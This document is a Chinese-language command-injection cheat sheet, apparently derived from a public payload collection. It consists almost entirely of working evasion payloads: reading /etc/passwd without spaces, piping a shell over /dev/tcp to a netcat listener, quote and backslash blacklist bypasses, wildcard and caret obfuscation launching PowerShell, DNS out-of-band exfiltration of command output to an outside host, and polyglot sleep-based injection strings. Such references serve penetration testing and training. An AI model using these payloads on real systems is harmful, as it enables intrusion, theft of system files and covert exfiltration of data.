# 命令注入

> 命令注入是一种允许攻击者在易受攻击的应用程序中执行任意命令的安全漏洞。

## 目录

* [工具](#工具)
* [绕过技巧](#绕过技巧)
  * [绕过空格](#绕过空格)
  * [黑名单绕过](#黑名单绕过)
   * [利用换行绕过](#利用换行绕过)
   * [使用单引号](#使用单引号)
   * [使用双引号](#使用双引号)
   * [使用正/反斜杠](#使用正/反斜杠)
   * [使用$@](#使用$@)
   * [使用通配符](#使用通配符)

* [DNS带外传输](#DNS带外传输)
* [多种混合绕过](#多种混合绕过)
* [参考](#参考)

## 工具

* [commix - Automated All-in-One OS command injection and exploitation tool](https://github.com/commixproject/commix)


## 绕过技巧

### 绕过空格

#### linux

```
root@kali:~/Desktop# cat</etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

```
root@kali:~/Desktop# {cat,/etc/passwd}

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

```
root@kali:~/Desktop# cat$IFS/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

```
root@kali:~/Desktop# cat${IFS}/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

```
root@kali:~/Desktop# X=$'uname\x20-a'&&$X

Linux kali 4.19.0-kali4-amd64 #1 SMP Debian 4.19.28-2kali1 (2019-03-18) x86_64 GNU/Linux
```

```
root@kali:~/Desktop# sh</dev/tcp/127.0.0.1/9999
root

root@kali:~/Desktop# nc -lvvp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 34274
whoami
```

#### linux bash

Commands execution without spaces, $ or { } - Linux 

```
IFS=,;`cat<<<uname,-a`
```

#### windows

```
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```


### 黑名单绕过

#### 利用换行绕过

```
something%0Acat%20/etc/passwd
```

#### 使用单引号

```
root@kali:~/Desktop# w'h'o'am'i

root
```

#### 使用双引号

```
root@kali:~/Desktop# w"h"o"am"i

root
```

#### 使用正/反斜杠

```
root@kali:~/Desktop# w\ho\am\i

root
```

#### 使用$@

```
root@kali:~/Desktop# who$@ami

root

```

```
root@kali:~/Desktop# echo $0

bash
```


#### 使用通配符

```
/???/??t /???/p??s??

test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

```
C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## DNS带外传输

```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'

ping -c 1 `ls`.3a43c7e4e57a8d0e2057.d.zhack.ca
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```

推荐的在线dns测试平台：

- dnsbin.zhack.ca
- pingb.in

## 多种混合绕过

```
bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

e.g:
echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

```
bash
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/

e.g:
echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
```

## 参考

* [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
* [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
* [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
